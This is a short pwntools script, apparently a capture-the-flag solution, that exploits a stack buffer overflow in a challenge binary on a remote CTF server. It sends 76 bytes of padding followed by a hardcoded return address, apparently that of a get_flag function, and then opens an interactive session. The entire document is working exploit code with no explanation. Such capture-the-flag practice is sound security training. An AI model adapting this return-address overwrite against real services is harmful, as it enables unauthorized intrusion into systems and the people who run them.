from pwn import *


context.binary =elf =ELF('./chall')
context.log_level='debug'


#p=process()
p =remote('bof1.hackini24.shellmates.club',443)
pay=b'a'*76
flag= elf.symbols['get_flag']
pay +=p32(0x8049230)
p.recvuntil('name:')


	


write('payload',pay)

p.sendline(pay)


p.recv()
p.interactive()


